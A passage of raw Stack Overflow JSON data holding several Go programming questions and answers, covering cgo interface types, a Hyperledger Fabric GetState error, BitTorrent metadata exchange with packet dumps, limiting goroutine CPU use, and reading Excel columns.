{ void *t; void *v; } GoInterface;\ntypedef struct { void *data; GoInt len; GoInt cap; } GoSlice;\n/* Return type for SearchStringValue */\nstruct SearchString_return {\n    GoInterface r0; /* v */\n    GoUint8 r1; /* ok */\n};\n\nextern struct SearchString_return SearchStringValue(GoString p0);\nextern GoUint8 AddString(GoString p0, GoInterface p1);\n</code></pre>\n\n<p>Now the question is how to implement the empty interface{} in C code?</p>\n"}, {"tags": ["go", "hyperledger-fabric"], "comments": [{"owner": {"reputation": 1938, "user_id": 8205919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fa64e238ce0ea70db6f924b050f4faa?s=128&d=identicon&r=PG&f=1", "display_name": "Dave Enyeart", "link": "https://stackoverflow.com/users/8205919/dave-enyeart"}, "edited": false, "score": 0, "creation_date": 1540421109, "post_id": 52971324, "comment_id": 92864252, "body": "After looking in Fabric source code, it appears you can hit the error &quot;No revision tag detected&quot; if you attempt to GetState() on an empty string. I suspect your formation.PersonID may result in an empty string in the failing scenario. Can you add log statements at each step to see what is returned as formationAsBytes and what formation.PersonID resolves to?"}, {"owner": {"reputation": 41, "user_id": 3218334, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e109e7ccd00257e4a84c70a6185eb0a2?s=128&d=identicon&r=PG&f=1", "display_name": "A. Parolini", "link": "https://stackoverflow.com/users/3218334/a-parolini"}, "reply_to_user": {"reputation": 1938, "user_id": 8205919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fa64e238ce0ea70db6f924b050f4faa?s=128&d=identicon&r=PG&f=1", "display_name": "Dave Enyeart", "link": "https://stackoverflow.com/users/8205919/dave-enyeart"}, "edited": false, "score": 0, "creation_date": 1540451175, "post_id": 52971324, "comment_id": 92872282, "body": "@DaveEnyeart You are absolutly correct: some of my ID are empty. The error was missleading. Thanks!"}], "answers": [{"tags": [], "owner": {"reputation": 41, "user_id": 3218334, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e109e7ccd00257e4a84c70a6185eb0a2?s=128&d=identicon&r=PG&f=1", "display_name": "A. Parolini", "link": "https://stackoverflow.com/users/3218334/a-parolini"}, "is_accepted": false, "score": 0, "last_activity_date": 1540455226, "creation_date": 1540455226, "answer_id": 52984441, "question_id": 52971324, "link": "https://stackoverflow.com/questions/52971324/cannot-call-getstate-right-after-getqueryresultquerystring-on-hyperledger-fabr/52984441#52984441", "title": "Cannot call GetState right after GetQueryResult(queryString) on Hyperledger Fabric Chaincode", "body": "<p>As @DaveEnYeart dound out,  some of my ID are empty. </p>\n"}], "owner": {"reputation": 41, "user_id": 3218334, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e109e7ccd00257e4a84c70a6185eb0a2?s=128&d=identicon&r=PG&f=1", "display_name": "A. Parolini", "link": "https://stackoverflow.com/users/3218334/a-parolini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 745, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1540455226, "creation_date": 1540390724, "last_edit_date": 1540391599, "question_id": 52971324, "link": "https://stackoverflow.com/questions/52971324/cannot-call-getstate-right-after-getqueryresultquerystring-on-hyperledger-fabr", "title": "Cannot call GetState right after GetQueryResult(queryString) on Hyperledger Fabric Chaincode", "body": "<p>On my Fabric Golang chaincode, I need to find a list of object, then loop and call <code>getState()</code> on other objects on the ledger. It work with <code>GetStateByRange()</code>, but not with <code>GetQueryResult()</code>. All those are from <code>shim.ChaincodeStubInterface</code></p>\n\n<p>With <code>GetQueryResult()</code> I get a \"No revision tag detected\" after every <code>getState()</code></p>\n\n<p>Examples:</p>\n\n<p>This works!</p>\n\n<pre><code>func (s *SmartContract) queryAllFormations(APIstub shim.ChaincodeStubInterface, args []string) sc.Response {\n\n                resultsIterator, _ := APIstub.GetStateByRange(\"FORM_1\",\"FORM_99\")\n                for resultsIterator.HasNext() {\n                    var formation Formation\n                    json.Unmarshal(formationAsBytes.Value, &amp;formation)\n                    formationAsBytes, _:= resultsIterator.Next()\n                    // Will succeed !\n                    personAsBytes, _:= APIstub.GetState(formation.PersonID)\n                    [...]\n                 }\n                 resultsIterator.Close()\n</code></pre>\n\n<p>This will fail!</p>\n\n<pre><code>func (s *SmartContract) queryAllFormations(APIstub shim.ChaincodeStubInterface, args []string) sc.Response {\n            queryString := ...\n            resultsIterator, _ := APIstub.GetQueryResult(queryString)\n            for resultsIterator.HasNext() {\n                formationAsBytes, _:= resultsIterator.Next()\n                var formation Formation\n                json.Unmarshal(formationAsBytes.Value, &amp;formation)\n                // WILL fail\n                personAsBytes, _:= APIstub.GetState(formation.PersonID)\n                [...]\n            }\n            resultsIterator.Close()\n</code></pre>\n\n<blockquote>\n  <p>error: [client-utils.js]: sendPeersProposal - Promise is rejected:\n  Error: GET_STATE failed: transaction ID:\n  2117b32cc69873be0e752eb644250c4156f29d9ec48d385f88d43ca1705b909d: No\n  revision tag detected\n      at /home/apa/DEV/rinku/rinku-server/node_modules/fabric-client/lib/Peer.js:114:16\n      at /home/apa/DEV/rinku/rinku-server/node_modules/fabric-client/node_modules/grpc/src/client.js:586:7</p>\n</blockquote>\n\n<p>Any idea ? Thanks in advance</p>\n"}, {"tags": ["go", "bittorrent", "dht"], "answers": [{"tags": [], "owner": {"reputation": 1842, "user_id": 3693974, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85bbafa667efd7099cffcb0ae525f278?s=128&d=identicon&r=PG&f=1", "display_name": "Encombe", "link": "https://stackoverflow.com/users/3693974/encombe"}, "is_accepted": false, "score": 1, "last_activity_date": 1540409675, "last_edit_date": 1540409675, "creation_date": 1540408901, "answer_id": 52976500, "question_id": 52970941, "link": "https://stackoverflow.com/questions/52970941/download-the-metadata-from-peers-failed-by-bep-0009-golang/52976500#52976500", "title": "Download the metadata from peers failed by bep_0009 [golang]", "body": "<p>From the pcap:  </p>\n\n<pre><code>00000044  00 00 00 00 14 00 64 31  3a 6d 64 31 31 3a 75 74   ......d1 :md11:ut\n00000054  5f 6d 65 74 61 64 61 74  61 69 31 65 65 65         _metadat ai1eee\n</code></pre>\n\n<p>You're sending <code>00 00 00 00</code> as the length for the extension handshake. That will be interpreted as a keepalive message and the rest as a message with length <code>14 00 64 31</code> and type <code>3a</code> i.e. complete nonsense.  </p>\n\n<hr>\n\n<p>Complete pcap:<br>\n<code>00000000  13 42 69 74 54 6f 72 72  65 6e 74 20 70 72 6f 74   .BitTorr ent prot\n00000010  6f 63 6f 6c 00 00 00 00  00 10 00 01 e7 82 f4 a3   ocol.... ........\n00000020  f4 7a cb e8 4e da 1d 74  f0 e8 92 ec c7 48 84 fe   .z..N..t .....H..\n00000030  0d 3a 6c 0f 88 e8 41 45  b9 96 b4 52 62 eb 33 cc   .:l...AE ...Rb.3.\n00000040  ca 73 8b bf                                        .s..\n    00000000  13 42 69 74 54 6f 72 72  65 6e 74 20 70 72 6f 74   .BitTorr ent prot\n    00000010  6f 63 6f 6c 00 00 00 00  00 10 00 05 e7 82 f4 a3   ocol.... ........\n    00000020  f4 7a cb e8 4e da 1d 74  f0 e8 92 ec c7 48 84 fe   .z..N..t .....H..\n    00000030  2d 55 54 33 35 34 53 2d  58 ae 73 ad 79 d9 8e d6   -UT354S- X.s.y...\n    00000040  bd be b0 5f 00 00 00 e6  14 00 64 31 3a 65 69 30   ..._.... ..d1:ei0\n    00000050  65 34 3a 69 70 76 34 34  3a cb 51 43 72 31 32 3a   e4:ipv44 :.QCr12:\n    00000060  63 6f 6d 70 6c 65 74 65  5f 61 67 6f 69            complete _agoi\n00000044  00 00 00 00 14 00 64 31  3a 6d 64 31 31 3a 75 74   ......d1 :md11:ut\n00000054  5f 6d 65 74 61 64 61 74  61 69 31 65 65 65         _metadat ai1eee\n    0000006D  33 65 31 3a 6d 64 31 31  3a 75 70 6c 6f 61 64 5f   3e1:md11 :upload_\n    0000007D  6f 6e 6c 79 69 33 65 31  31 3a 6c 74 5f 64 6f 6e   onlyi3e1 1:lt_don\n    0000008D  74 68 61 76 65 69 37 65  31 32 3a 75 74 5f 68 6f   thavei7e 12:ut_ho\n    0000009D  6c 65 70 75 6e 63 68 69  34 65 31 31 3a 75 74 5f   lepunchi 4e11:ut_\n    000000AD  6d 65 74 61 64 61 74 61  69 32 65 36 3a 75 74 5f   metadata i2e6:ut_\n    000000BD  70 65 78 69 31 65 31 30  3a 75 74 5f 63 6f 6d 6d   pexi1e10 :ut_comm\n    000000CD  65 6e 74 69 36 65 65 31  33 3a 6d 65 74 61 64 61   enti6ee1 3:metada\n    000000DD  74 61 5f 73 69 7a 65 69  38 38 38 32 65 31 3a 70   ta_sizei 8882e1:p\n    000000ED  69 35 35 32 35 34 65 34  3a 72 65 71 71 69 32 35   i55254e4 :reqqi25\n    000000FD  35 65 31 3a 76 31 35 3a  ce bc 54 6f 72 72 65 6e   5e1:v15: ..Torren\n    0000010D  74 20 33 2e 35 2e 34 32  3a 79 70 69 33 31 34 30   t 3.5.42 :ypi3140\n    0000011D  38 65 36 3a 79 6f 75 72  69 70 34 3a 75 8b d0 19   8e6:your ip4:u...\n    0000012D  65 00 00 00 38 05 ff ef  ff df f7 f7 ff ff ff ff   e...8... ........\n    0000013D  ff df ff ff df ff ff ff  ef ff ff ee fe ff ff ff   ........ ........\n    0000014D  6f ff ff 99 ff ff fd ff  ff ff ff ff ff ff ef ff   o....... ........\n    0000015D  ff fe f7 ff ff fc ff bf  ff ff bf ff c0 00 00 00   ........ ........\n    0000016D  05 04 00 00 00 5a 00 00  00 05 04 00 00 00 0b 00   .....Z.. ........\n    0000017D  00 00 05 04 00 00 00 e9  00 00 00 05 04 00 00 00   ........ ........\n    0000018D  ea 00 00 00 05 04 00 00  01 64 00 00 00 05 04 00   ........ .d......\n    0000019D  00 01 5f 00 00 00 05 04  00 00 00 d3 00 00 00 05   .._..... ........\n    000001AD  04 00 00 01 7f 00 00 00  05 04 00 00 00 1a 00 00   ........ ........\n    000001BD  00 05 04 00 00 00 24 00  00 00 05 04 00 00 01 89   ......$. ........\n    000001CD  00 00 00 05 04 00 00 00  ee 00 00 00 05 04 00 00   ........ ........\n    000001DD  01 06 00 00 00 05 04 00  00 00 ed 00 00 00 05 04   ........ ........\n    000001ED  00 00 00 2c 00 00 00 05  04 00 00 00 93 00 00 00   ...,.... ........\n    000001FD  05 04 00 00 00 ab 00 00  00 05 04 00 00 00 d0 00   ........ ........\n    0000020D  00 00 05 04 00 00 00 b7  00 00 00 05 04 00 00 01   ........ ........\n    0000021D  a1 00 00 00 05 04 00 00  00 72 00 00 00 05 04 00   ........ .r......\n    0000022D  00 01 43 00 00 00 05 04  00 00 01 7e 00 00 00 05   ..C..... ...~....\n    0000023D  04 00 00 00 af                                     .....\n00000062  00 00 00 1b 14 02 64 38  3a 6d 73 67 5f 74 79 70   ......d8 :msg_typ\n00000072  65 69 30 65 35 3a 70 69  65 63 65 69 30 65 65      ei0e5:pi ecei0ee\n    00000242  13 42 69 74 54 6f 72 72  65 6e 74 20 70 72 6f 74   .BitTorr ent prot\n    00000252  6f 63 6f 6c 00 00 00 00  00 10 00 05 e7 82 f4 a3   ocol.... ........\n    00000262  f4 7a cb e8 4e da 1d 74  f0 e8 92 ec c7 48 84 fe   .z..N..t .....H..\n    00000272  2d 55 54 33 35 34 53 2d  58 ae 73 ad 79 d9 8e d6   -UT354S- X.s.y...\n    00000282  bd be b0 5f 00 00 00 e6  14 00 64 31 3a 65 69 30   ..._.... ..d1:ei0\n    00000292  65 34 3a 69 70 76 34 34  3a cb 51 43 72 31 32 3a   e4:ipv44 :.QCr12:\n    000002A2  63 6f 6d 70 6c 65 74 65  5f 61 67 6f 69 33 65 31   complete _agoi3e1\n    000002B2  3a 6d 64 31 31 3a 75 70  6c 6f 61 64 5f 6f 6e 6c   :md11:up load_onl\n    000002C2  79 69 33 65 31 31 3a 6c  74 5f 64 6f 6e 74 68 61   yi3e11:l t_dontha\n    000002D2  76 65 69 37 65 31 32 3a  75 74 5f 68 6f 6c 65 70   vei7e12: ut_holep\n    000002E2  75 6e 63 68 69 34 65 31  31 3a 75 74 5f 6d 65 74   unchi4e1 1:ut_met\n    000002F2  61 64 61 74 61 69 32 65  36 3a 75 74 5f 70 65 78   adatai2e 6:ut_pex\n    00000302  69 31 65 31 30 3a 75 74  5f 63 6f 6d 6d 65 6e 74   i1e10:ut _comment\n    00000312  69 36 65 65 31 33 3a 6d  65 74 61 64 61 74 61 5f   i6ee13:m etadata_\n    00000322  73 69 7a 65 69 38 38 38  32 65 31 3a 70 69 35 35   sizei888 2e1:pi55\n    00000332  32 35 34 65 34 3a 72 65  71 71 69 32 35 35 65 31   254e4:re qqi255e1\n    00000342  3a 76 31 35 3a ce bc 54  6f 72 72 65 6e 74 20 33   :v15:..T orrent 3\n    00000352  2e 35 2e 34 32 3a 79 70  69 33 31 34 30 38 65 36   .5.42:yp i31408e6\n    00000362  3a 79 6f 75 72 69 70 34  3a 75 8b d0 19 65 00 00   :yourip4 :u...e..\n    00000372  00 38 05 ff ef ff df f7  f7 ff ff ff ff ff df ff   .8...... ........\n    00000382  ff df ff ff ff ef ff ff  ee fe ff ff ff 6f ff ff   ........ .....o..\n    00000392  99 ff ff fd ff ff ff ff  ff ff ff ef ff ff fe f7   ........ ........\n    000003A2  ff ff fc ff bf ff ff bf  ff c0 00 00 00 05 04 00   ........ ........\n    000003B2  00 00 5a 00 00 00 05 04  00 00 00 0b 00 00 00 05   ..Z..... ........\n    000003C2  04 00 00 00 e9 00 00 00  05 04 00 00 00 ea 00 00   ........ ........\n    000003D2  00 05 04 00 00 01 64 00  00 00 05 04 00 00 01 5f   ......d. ......._\n    000003E2  00 00 00 05 04 00 00 00  d3 00 00 00 05 04 00 00   ........ ........\n    000003F2  01 7f 00 00 00 05 04 00  00 00 1a 00 00 00 05 04   ........ ........\n    00000402  00 00 00 24 00 00 00 05  04 00 00 01 89 00 00 00   ...$.... ........\n    00000412  05 04 00 00 00 ee 00 00  00 05 04 00 00 01 06 00   ........ ........\n    00000422  00 00 05 04 00 00 00 ed  00 00 00 05 04 00 00 00   ........ ........\n    00000432  2c 00 00 00 05 04 00 00  00 93 00 00 00 05 04 00   ,....... ........\n    00000442  00 00 ab 00 00 00 05 04  00 00 00 d0 00 00 00 05   ........ ........\n    00000452  04 00 00 00 b7 00 00 00  05 04 00 00 01 a1 00 00   ........ ........\n    00000462  00 05 04 00 00 00 72 00  00 00 05 04 00 00 01 43   ......r. .......C\n    00000472  00 00 00 05 04 00 00 01  7e 00 00 00 05 04 00 00   ........ ~.......\n    00000482  00 af 00 00 00 03 09 d7  d6                        ........ .</code></p>\n"}], "owner": {"reputation": 29, "user_id": 1355932, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65342e152b52e5f3b332e4d780d4d642?s=128&d=identicon&r=PG", "display_name": "40robber", "link": "https://stackoverflow.com/users/1355932/40robber"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1540409675, "creation_date": 1540389616, "last_edit_date": 1540390745, "question_id": 52970941, "link": "https://stackoverflow.com/questions/52970941/download-the-metadata-from-peers-failed-by-bep-0009-golang", "title": "Download the metadata from peers failed by bep_0009 [golang]", "body": "<p>When I send an extension request message to peers, but no response from peers.</p>\n\n<p>I got Handshake and Extended Bitfield and Have Piece ok, but no extension data message.</p>\n\n<p>This is my Golang code.</p>\n\n<pre><code>package main\n\nimport (\n    \"bytes\"\n    \"crypto/rand\"\n    \"encoding/binary\"\n    \"fmt\"\n    \"github.com/IncSW/go-bencode\"\n    \"io\"\n    \"log\"\n    \"net\"\n    \"time\"\n)\n\nfunc readBuffer(conn *net.TCPConn, size uint32) ([]byte, error) {\n    //temp := make([]byte, size)\n    //_, err := conn.Read(temp)\n    //if err != nil {\n    //  return nil, fmt.Errorf(\"read %d bytes message failed: %v\", size, err)\n    //}\n    //return temp, nil\n    buffer := bytes.NewBuffer(nil)\n    conn.SetReadDeadline(time.Now().Add(time.Second * 120))\n    _, err := io.CopyN(buffer, conn, int64(size))\n    if err != nil {\n        return nil, fmt.Errorf(\"read %d bytes message failed: %v\", size, err)\n    }\n    return buffer.Bytes(), nil\n}\n\nfunc next(conn *net.TCPConn) ([]byte, error) {\n    buffer, err := readBuffer(conn, 4)\n    if nil != err {\n        return nil, err\n    }\n    buffer, err = readBuffer(conn, binary.BigEndian.Uint32(buffer))\n    if nil != err {\n        return nil, err\n    }\n    return buffer, nil\n}\n\nfunc getHandshake(infoHash []byte, nodeId []byte) []byte {\n    packet := []byte{19, 66, 105, 116, 84, 111, 114, 114, 101, 110, 116, 32, 112, 114, 111, 116, 111, 99, 111, 108, 0, 0, 0, 0, 0, 16, 0, 1}\n    packet = append(packet, infoHash...)\n    packet = append(packet, nodeId...)\n    return packet\n}\n\n// http://www.bittorrent.org/beps/bep_0009.html\n// http://www.bittorrent.org/beps/bep_0010.html\nfunc peerWire(addr string, infoHash []byte, nodeId []byte) {\n    dial, err := net.DialTimeout(\"tcp\", addr, 10*time.Second)\n    if nil != err {\n        return\n    }\n    conn := dial.(*net.TCPConn)\n    conn.SetLinger(0)\n    defer conn.Close()\n    // handshake\n    handshake := getHandshake(infoHash, nodeId)\n    conn.Write(handshake)\n    handshakeRes := make([]byte, 68)\n    _, err = conn.Read(handshakeRes)\n    if !(bytes.Equal(handshake[:20], handshakeRes[:20]) &amp;&amp; handshakeRes[25]&amp;0x10 != 0) {\n        log.Println(\"invalid handshake response\")\n        return\n    }\n    // extended handshake\n    // [length prefix][BitTorrent message ID][extended message ID]\n    extendedHandshake, _ := bencode.Marshal(map[string]interface{}{\n        \"m\": map[string]interface{}{\"ut_metadata\": 1},\n    })\n    extendedHandshake = append([]byte{20, 0}, extendedHandshake...)\n    size := make([]byte, 4)\n    extendedHandshake = append(size, extendedHandshake...)\n    conn.Write(extendedHandshake)\n    buffer, err := next(conn)\n    if nil != err {\n        log.Println(err.Error())\n        return\n    }\n    if 0 &lt; len(buffer) {\n        msgUT, err := bencode.Unmarshal(buffer[2:])\n        if nil != err {\n            log.Println(\"error\")\n            return\n        }\n        metadataSize, ok := msgUT.(map[string]interface{})[\"metadata_size\"].(int64)\n        if !ok {\n            return\n        }\n        m, ok := msgUT.(map[string]interface{})[\"m\"].(map[string]interface{})\n        if !ok {\n            return\n        }\n        utMetadata, ok := m[\"ut_metadata\"].(int64)\n        if !ok {\n            return\n        }\n        numberOfPieces := metadataSize / 16384\n        if metadataSize%16384 != 0 {\n            numberOfPieces++\n        }\n\n        for i := 0; i &lt; int(numberOfPieces); i++ {\n            packet, err := bencode.Marshal(map[string]interface{}{\"msg_type\":0, \"piece\":int(i)})\n            if nil != err {\n                log.Println(err)\n            }\n            packet = append([]byte{20, byte(utMetadata)}, packet...)\n            size := make([]byte, 4)\n            binary.BigEndian.PutUint32(size, uint32(len(packet)))\n            packet = append(size, packet...)\n            conn.Write(packet)\n            break\n        }\n        piece := make([]byte, 0)\n        for {\n            buffer, err := next(conn)\n            if nil != err {\n                log.Println(err.Error())\n                break\n            }\n            log.Println(buffer)\n            if 20 != buffer[0] {\n                continue\n            }\n            log.Println(\"buffer: \", buffer)\n            piece = append(piece, buffer...)\n        }\n        log.Println(\"index :\", bytes.Index(piece, []byte(\"ee\")))\n    }\n}\n\nfunc main() {\n    nodeId := make([]byte, 20)\n    rand.Read(nodeId)\n    infoHash := []byte{231, 130, 244, 163, 244, 122, 203, 232, 78, 218, 29, 116, 240, 232, 146, 236, 199, 72, 132, 254}\n    addr := \"203.81.67.114:55254\"\n    peerWire(addr, infoHash, nodeId)\n}\n</code></pre>\n\n<p>I think the extension request message \"[]byte{0, 0, 0, 27, 20, 2, 100, 53, 58, 112, 105, 101, 99, 101, 105, 48, 101, 56, 58, 109, 115, 103, 95, 116, 121, 112, 101, 105, 48, 101, 101}\" format is correct.</p>\n\n<p><a href=\"https://i.stack.imgur.com/dcgd8.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/dcgd8.png\" alt=\"enter image description here\"></a></p>\n\n<p><a href=\"https://share-bucket-one.oss-cn-hangzhou.aliyuncs.com/bep_0009.pcapng\" rel=\"nofollow noreferrer\" title=\"WireShark Data\">WireShark Dump Data</a></p>\n"}, {"tags": ["windows", "go", "concurrency", "goroutine"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540391945, "post_id": 52970904, "comment_id": 92849841, "body": "There is not pount in having much more runnable goroutines than cores, so yes: limit them. Decrease GOMAXPROCS to limit how many threads and thus cores you program will use."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 9562929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee78eb7ee7fbbad36fe906adb843d55?s=128&d=identicon&r=PG", "display_name": "Zec", "link": "https://stackoverflow.com/users/9562929/zec"}, "edited": false, "score": 1, "creation_date": 1540389897, "post_id": 52970955, "comment_id": 92848350, "body": "so i should outsource the part that does the translation and start it from main with some kind of loader with a given priority? like gui+jobs+solver?"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "reply_to_user": {"reputation": 19, "user_id": 9562929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee78eb7ee7fbbad36fe906adb843d55?s=128&d=identicon&r=PG", "display_name": "Zec", "link": "https://stackoverflow.com/users/9562929/zec"}, "edited": false, "score": 0, "creation_date": 1540390646, "post_id": 52970955, "comment_id": 92848896, "body": "That depends entirely on your needs. Do whatever works for your situation. If running the whole thing at lowered priority works, I don&#39;t see any reason to make it more complicated than that."}, {"owner": {"reputation": 19, "user_id": 9562929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee78eb7ee7fbbad36fe906adb843d55?s=128&d=identicon&r=PG", "display_name": "Zec", "link": "https://stackoverflow.com/users/9562929/zec"}, "edited": false, "score": 0, "creation_date": 1540390875, "post_id": 52970955, "comment_id": 92849072, "body": "i just would like to skip the manual priority decrease via task manager to let it be as userfriendly as possible. the most simple but ugly solution could be a clickme.cmd that starts the exe with prio below normal... but that&#39;s not smart."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "reply_to_user": {"reputation": 19, "user_id": 9562929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee78eb7ee7fbbad36fe906adb843d55?s=128&d=identicon&r=PG", "display_name": "Zec", "link": "https://stackoverflow.com/users/9562929/zec"}, "edited": false, "score": 0, "creation_date": 1540393249, "post_id": 52970955, "comment_id": 92850763, "body": "Updated with more options."}], "tags": [], "owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "is_accepted": true, "score": 3, "last_activity_date": 1540393236, "last_edit_date": 1540393236, "creation_date": 1540389643, "answer_id": 52970955, "question_id": 52970904, "link": "https://stackoverflow.com/questions/52970904/possibility-to-not-hook-all-available-cpu-power/52970955#52970955", "title": "Possibility to NOT hook all available CPU power?", "body": "<p>Lowering the process priority is arguably the <em>correct</em> way to do this. Use your OS's scheduler. That's what it's for. <a href=\"https://superuser.com/questions/699651/start-process-in-high-priority\">Per this question</a> you can start your process with a specified priority like so:</p>\n\n<pre><code>start \"MyApp\" /low \"C:\\myapp.exe\"\n</code></pre>\n\n<p>You <em>may</em> also be able to set process priority from within the application <a href=\"https://stackoverflow.com/questions/36928541/how-to-change-process-application-priority-from-normal-to-low-programmatically\">per this question</a>:</p>\n\n<pre><code>err := syscall.Setpriority(syscall.Getpid(), -1, -1)\n</code></pre>\n\n<p>Lastly, you can use <code>GOMAXPROCS</code> to configure how many CPUs the process is allowed to use. You can pass it in as an environment variable at runtime, or call <a href=\"https://golang.org/pkg/runtime/#GOMAXPROCS\" rel=\"nofollow noreferrer\"><code>runtime.GOMAXPROCS()</code></a> within your code to override it. </p>\n"}, {"tags": [], "owner": {"reputation": 551, "user_id": 10554768, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0874152f77551e2be38904d25e5822e?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/10554768/robert"}, "is_accepted": false, "score": -1, "last_activity_date": 1540422717, "creation_date": 1540422717, "answer_id": 52979158, "question_id": 52970904, "link": "https://stackoverflow.com/questions/52970904/possibility-to-not-hook-all-available-cpu-power/52979158#52979158", "title": "Possibility to NOT hook all available CPU power?", "body": "<p>Probably the simplest solution is to limit the number of concurrent goroutines using a semaphore, for example:</p>\n\n<pre><code>sem := make(chan int, 10) // limited at go routines \n\nfor {\n    sem &lt;- 1\n    go doThis()\n}\n\nfunc doThis() {\n    //do this\n    &lt;- sem\n}\n</code></pre>\n\n<p>The \"sem &lt;- 1\" inside the for loop blocks until a goroutine \"slot\" is freed up by doThis extracting something from the sem channel/</p>\n"}], "owner": {"reputation": 19, "user_id": 9562929, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ee78eb7ee7fbbad36fe906adb843d55?s=128&d=identicon&r=PG", "display_name": "Zec", "link": "https://stackoverflow.com/users/9562929/zec"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 52970955, "answer_count": 2, "score": -2, "last_activity_date": 1540479803, "creation_date": 1540389494, "last_edit_date": 1540479508, "question_id": 52970904, "link": "https://stackoverflow.com/questions/52970904/possibility-to-not-hook-all-available-cpu-power", "title": "Possibility to NOT hook all available CPU power?", "body": "<p>I know, most of the beginners of go ask how to have performative go-routines / concurrency, this point I passed a few weeks ago. :-)</p>\n\n<p>I have a real fast trans-coder that uses every cycle available of my 4+4 (i7 HT) CPU. It reads a file into a slice of pointers to structs, does calculations on these and writes the result back to disk. I am using bufio. I am coming from VB so the performance of Go is unbelievable.</p>\n\n<p>I tried to add minimal sleeps (via time.Sleep()), but that drastically decreased performance.</p>\n\n<p>While my trans-coder is working the whole system is lagging. I must change the go task's priority to low or idle to be able to work again.</p>\n\n<p>How could I implement something that keeps the system responsive?</p>\n\n<p>Right now I start thousands of go-routines (loop over a slice of pointers). Should I limit the number of routines?</p>\n"}, {"tags": ["excel", "go"], "answers": [{"comments": [{"owner": {"reputation": 1461, "user_id": 7473025, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/734442f1cb6ac1e717cf798c5292ba15?s=128&d=identicon&r=PG&f=1", "display_name": "Robert Andersson", "link": "https://stackoverflow.com/users/7473025/robert-andersson"}, "edited": false, "score": 0, "creation_date": 1540408384, "post_id": 52976256, "comment_id": 92859268, "body": "That second option looks promising, I&#39;ll have a look at it tomorrow and see if it made a differrence, thank you!"}, {"owner": {"reputation": 1461, "user_id": 7473025, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/734442f1cb6ac1e717cf798c5292ba15?s=128&d=identicon&r=PG&f=1", "display_name": "Robert Andersson", "link": "https://stackoverflow.com/users/7473025/robert-andersson"}, "edited": false, "score": 0, "creation_date": 1540465338, "post_id": 52976256, "comment_id": 92880553, "body": "Second option was a lot faster, saved me ~4 seconds, thanks again!"}], "tags": [], "owner": {"reputation": 84923, "user_id": 1920232, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iUA8y.jpg?s=128&g=1", "display_name": "peterm", "link": "https://stackoverflow.com/users/1920232/peterm"}, "is_accepted": true, "score": 2, "last_activity_date": 1540407888, "creation_date": 1540407888, "answer_id": 52976256, "question_id": 52970397, "link": "https://stackoverflow.com/questions/52970397/loop-through-specific-excel-columns-using-go/52976256#52976256", "title": "loop through specific excel columns using go", "body": "<p>It looks like there are at least a couple more ways</p>\n\n<p>by using rows iterator</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>rows, err := xlsx.Rows(\"Sheet1\")\nif err != nil {\n    log.Fatal(err)\n}\nfor rows.Next() {\n    row := rows.Columns()\n    fmt.Printf(\"%s\\t%s\\n\", row[1], row[3]) // Print values in columns B and D\n}\n</code></pre>\n\n<p>or if you know the exact range</p>\n\n<pre class=\"lang-golang prettyprint-override\"><code>n := 10001\nfor i := 1; i &lt; n; i++ {\n    b := xlsx.GetCellValue(\"Sheet1\", fmt.Sprintf(\"B%d\", i))\n    d := xlsx.GetCellValue(\"Sheet1\", fmt.Sprintf(\"D%d\", i))\n\n    fmt.Printf(\"%s\\t%s\\n\", b, d) // Print values in columns B and D\n}\n</code></pre>\n\n<p><em>I didn't go through the source of the library so it may or may not make a difference in terms of performance and (or) memory usage.</em></p>\n"}], "owner": {"reputation": 1461, "user_id": 7473025, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/734442f1cb6ac1e717cf798c5292ba15?s=128&d=identicon&r=PG&f=1", "display_name": "Robert Andersson", "link": "https://stackoverflow.com/users/7473025/robert-andersson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1650, "favorite_count": 0, "accepted_answer_id": 